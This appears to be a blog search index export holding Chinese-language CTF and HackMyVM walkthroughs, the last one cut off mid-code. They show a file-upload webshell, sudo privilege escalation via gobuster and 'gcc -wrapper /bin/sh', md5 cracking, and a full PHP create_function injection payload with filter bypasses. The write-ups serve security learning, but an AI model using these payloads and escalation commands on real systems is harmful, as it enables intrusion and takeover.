<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HMV-UP</title>
      <link href="/2024/11/10/HMV-UP/"/>
      <url>/2024/11/10/HMV-UP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="HMV-UP"><a href="#HMV-UP" class="headerlink" title="HMV-UP"></a>HMV-UP</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─# ./fscan -h 192.168.20.132          </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">192.168.20.132:80 open</span><br><span class="line">[*] alive ports len is: 1</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://192.168.20.132     code:200 len:4489   title:RodGar - Subir Imagen</span><br><span class="line">已完成 1/1</span><br><span class="line">[*] 扫描结束,耗时: 1.989320329s</span><br></pre></td></tr></table></figure><p>发现80端口开启，访问网站</p><p>再扫一下网站目录发现了robots.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.20.132/uploads/&quot;</span><br></pre></td></tr></table></figure><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>查看robots.txt发现网站源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;  // 检查请求方法是否为 POST</span><br><span class="line">    $targetDir = &quot;uploads/&quot;;  // 设置目标目录为 &quot;uploads/&quot;</span><br><span class="line">    $fileName = basename($_FILES[&quot;image&quot;][&quot;name&quot;]);  // 获取上传文件的原始名称</span><br><span class="line">    $fileType = pathinfo($fileName, PATHINFO_EXTENSION);  // 获取文件扩展名</span><br><span class="line">    $fileBaseName = pathinfo($fileName, PATHINFO_FILENAME);  // 获取文件名称（不含扩展名）</span><br><span class="line"></span><br><span class="line">    $allowedTypes = [&#x27;jpg&#x27;, &#x27;jpeg&#x27;, &#x27;gif&#x27;];  // 允许的文件类型</span><br><span class="line">    if (in_array(strtolower($fileType), $allowedTypes)) &#123;  // 检查文件类型是否符合允许的类型</span><br><span class="line">        // 使用ROT13加密文件名</span><br><span class="line">        $encryptedFileName = strtr($fileBaseName, </span><br><span class="line">            &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;, </span><br><span class="line">            &#x27;NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm&#x27;);</span><br><span class="line"></span><br><span class="line">        $newFileName = $encryptedFileName . &quot;.&quot; . $fileType;  // 拼接加密后的文件名和原文件扩展名</span><br><span class="line">        $targetFilePath = $targetDir . $newFileName;  // 生成目标文件路径</span><br><span class="line"></span><br><span class="line">        // 将文件移动到目标目录</span><br><span class="line">        if (move_uploaded_file($_FILES[&quot;image&quot;][&quot;tmp_name&quot;], $targetFilePath)) &#123;</span><br><span class="line">            $message = &quot;El archivo se ha subido correctamente.&quot;;  // 成功上传提示</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $message = &quot;Hubo un error al subir el archivo.&quot;;  // 上传失败提示</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $message = &quot;Solo se permiten archivos JPG y GIF.&quot;;  // 文件类型不符合时提示</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接将木马写进gif图片上传，由于数字一般不会被rot13编码，所以用数字命名，上传访问即可拿到shell</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>权限很低，看看有没有root权限运行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@debian:/var/www/html/uploads$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for www-data on debian:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on debian:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/gobuster</span><br></pre></td></tr></table></figure><p>这里gobuster作用是一款用于目录和文件枚举的开源工具。它主要用于在 Web应用程序Q或网站上査找隐藏的目录和文件，从而进行信息收集或渗透测试。</p><p>记得刚刚目录扫描到了一个clue.txt的线索文件，看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@debian:/var/www/html/uploads$ cat clue.txt</span><br><span class="line">cat clue.txt</span><br><span class="line">/root/rodgarpass</span><br></pre></td></tr></table></figure><p>那么就可以利用这个软件的特性读到这个root目录下面的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">先在攻击机子上开启服务</span><br><span class="line">php -S 0.0.0.0:80</span><br><span class="line">然后进行爆破</span><br><span class="line">sudo gobuster dir -u http://192.168.20.128 -w /root/rodgarpass</span><br><span class="line">可以拿到内容</span><br><span class="line">[Sun Nov 10 18:06:14 2024] PHP 8.2.12 Development Server (http://0.0.0.0:80) started</span><br><span class="line">[Sun Nov 10 18:07:24 2024] 192.168.20.132:45110 Accepted</span><br><span class="line">[Sun Nov 10 18:07:24 2024] 192.168.20.132:45110 [404]: GET / - No such file or directory</span><br><span class="line">[Sun Nov 10 18:07:24 2024] 192.168.20.132:45110 Closing</span><br><span class="line">[Sun Nov 10 18:07:24 2024] 192.168.20.132:45114 Accepted</span><br><span class="line">[Sun Nov 10 18:07:24 2024] 192.168.20.132:45114 [404]: GET /949a1fce-4d9a-41e8-a125-a1927643519e - No such file or directory</span><br><span class="line">[Sun Nov 10 18:07:24 2024] 192.168.20.132:45114 Closing</span><br><span class="line">[Sun Nov 10 18:07:24 2024] 192.168.20.132:45130 Accepted</span><br><span class="line">[Sun Nov 10 18:07:24 2024] 192.168.20.132:45130 [404]: GET /b45cffe084dd3d20d928bee85e7b0f2 - No such file or directory</span><br><span class="line">[Sun Nov 10 18:07:24 2024] 192.168.20.132:45130 Closing</span><br></pre></td></tr></table></figure><p>这个文件提示的就是rodgar这个用户的密码，b45cffe084dd3d20d928bee85e7b0f2这串字符只有31位，一般md5是32位，那么极可能是密码，去网站上暴力识别一下</p><p><img src="/2024/11/10/HMV-UP/1.png"></p><p>然后看看string的md5值发现是b45cffe084dd3d20d928bee85e7b0f21</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─# echo -n string|md5sum</span><br><span class="line">b45cffe084dd3d20d928bee85e7b0f21  -</span><br></pre></td></tr></table></figure><p>可以登录rodgar用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@debian:/var/www/html/uploads$ su rodgar</span><br><span class="line">su rodgar</span><br><span class="line">Password: b45cffe084dd3d20d928bee85e7b0f21</span><br></pre></td></tr></table></figure><p>再看看可以以root执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rodgar@debian:/var/www/html/uploads$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for rodgar on debian:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User rodgar may run the following commands on debian:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make</span><br></pre></td></tr></table></figure><p>gcc是可以直接提权的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rodgar@debian:/var/www/html/uploads$ sudo gcc -wrapper /bin/sh,-s .</span><br><span class="line">sudo gcc -wrapper /bin/sh,-s .</span><br><span class="line"># whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>至此拿到的root权限，user的flag在&#x2F;home&#x2F;rodgar&#x2F;user.txt中，root的flag在&#x2F;root&#x2F;rooo_-tt.txt中</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>文件上传漏洞、sudo提权、hash补全</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HMV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hnctf2024</title>
      <link href="/2024/05/14/hnctf2024/"/>
      <url>/2024/05/14/hnctf2024/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020</title>
      <link href="/2023/11/26/BJDCTF2020/"/>
      <url>/2023/11/26/BJDCTF2020/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="BJDCTF2020"><a href="#BJDCTF2020" class="headerlink" title="BJDCTF2020"></a>BJDCTF2020</h1><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>进入页面提示flag不在这里，f12发现真正的页面在1nD3x.php，然后就是源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">sha1</span>(<span class="variable">$shana</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>含盖的知识点非常多</p><ol><li><p>首先就是<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>，这是取得url中的<code>?</code>后面的参数部分，可以看到过滤了非常多命令，但是我们可以知道<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不会对url编码进行解码，而是直接获取get参数的值，所以可以通过url编码绕过这一步,注意必须将字母编码，一般网上的url编码只编码非字母的字符，实质上就是asscii字符转16进制.</p></li><li><p><code>if (preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;)</code>要求debu传入值以<code>aqua_is_cute</code>开头并结尾，但是又不能为这个字符串，这里可以想到<code>%0a</code>截断匹配时识别到%0a自动停止，但是传入的值并不等于此字符串:<code>debu=aqua_is_cute%0a</code></p></li><li><p><code>if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))</code> 要求传入的参数中不能有字母，我们知道就算是url编码，由于实质是16进制，所以也会出现字母，但是我们可以通过post方法同时传参，这时候post方法传入的参数会自动覆盖get方法传入的参数，也就绕过了字母</p></li><li><p><code>if (file_get_contents($file) !== &#39;debu_debu_aqua&#39;)</code>，data伪协议的利用，<code>file=data://text/plain,debu_debu_aqua</code></p></li><li><p><code>if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )</code>强等于，用数组绕过即可：<code>shana[]=1&amp;passwd[]=2</code></p></li><li><p><code>extract($_GET[&quot;flag&quot;]);</code>传入的flag获取其键名为变量名，键值为变量值。</p></li><li><p>code变量又被过滤大量命令，<code>$code(&#39;&#39;, $arg);</code> 是一个典型的<code>create_function</code>代码注入，所以在传入flag时，进行代码注入，但是注入了很久出现的都是一串乱码：</p><p><img src="/2023/11/26/BJDCTF2020/ezphp.png"></p><p>了解到<code>get_defined_vars()</code>函数可以拿到已定义的变量<img src="/2023/11/26/BJDCTF2020/ezphp-1.png"></p><p>先看看变量有什么：<img src="/2023/11/26/BJDCTF2020/ezphp-2.png"></p><p>我们可以看到真正的flag在<code>rea1fl4g.php</code>，所以此时这个包含的flag中没有flag，那么这时候就可以通过php伪协议进行任意文件读取了，但是过滤了<code>.</code>号，这时候可以通过无字符取反操作绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;php://filter/convert.base64-encode/resource=rea1fl4g.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;~<span class="subst">$c</span>&quot;</span>;<span class="comment">//~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span></span><br></pre></td></tr></table></figure><p>即：<code>flag[code]=create_function&amp;flag[var]=&#125;var_dump(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//</code>&#x2F;&#x2F;作用是注释代码防止干扰</p></li><li><p>将后续操作中被第一步过滤的字符进行url编码，得到最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">1nD3x.php?file=data://text/plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]=%31&amp;%70%61%73%73%77%64[]=%32&amp;%66%6c%61%67[%63%6f%64%65]=create_function&amp;%66%6c%61%67[%61%72%67]=&#125;require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F );//</span><br><span class="line">POST:</span><br><span class="line">debu=1&amp;file=1&amp;shana=1&amp;passwd=2&amp;flag[code]=1&amp;flag[arg]=1</span><br></pre></td></tr></table></figure></li></ol><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PGh0bWw+DQo8aGVhZD4NCjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCjxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSI+DQo8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIG1heGltdW0tc2NhbGU9MSwgdXNlci1zY2FsYWJsZT1ubyI+DQo8dGl0bGU+UmVhbF9GbGFnIEluIEhlcmUhISE8L3RpdGxlPg0KPC9oZWFkPg0KPC9odG1sPg0KPD9waHANCgllY2hvICLlkqbvvIzkvaDlsYXnhLbmib7liLDmiJHkuobvvJ/vvIHkuI3ov4fnnIvliLDov5nlj6Xor53kuZ/kuI3ku6PooajkvaDlsLHog73mi7/liLBmbGFn5ZOm77yBIjsNCgkkZjRrZV9mbGFnID0gIkJKRHsxYW1fYV9mYWtlX2Y0MTExMWcyMzMzM30iOw0KCSRyZWExX2YxMTE0ZyA9ICJCSkR7Q29uZ3JhdHVsYXRpb25zIVkwdV9HZXRfdGhFX3JlYTFmMTExNGd9IjsNCgl1bnNldCgkcmVhMV9mMTExNGcpOw==</span><br></pre></td></tr></table></figure><p>base64解码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Real_Flag In Here!!!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">echo &quot;咦，你居然找到我了？！不过看到这句话也不代表你就能拿到flag哦！&quot;;</span></span><br><span class="line"><span class="meta">$f4ke_flag = &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;;</span></span><br><span class="line"><span class="meta">$rea1_f1114g = &quot;BJD&#123;Congratulations!Y0u_Get_thE_rea1f1114g&#125;&quot;;</span></span><br><span class="line"><span class="meta">unset($rea1_f1114g);</span></span><br></pre></td></tr></table></figure><h2 id="mark"><a href="#mark" class="headerlink" title="mark"></a>mark</h2><p>git泄露，用githack把源码下载下来，关键代码在index.php中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] 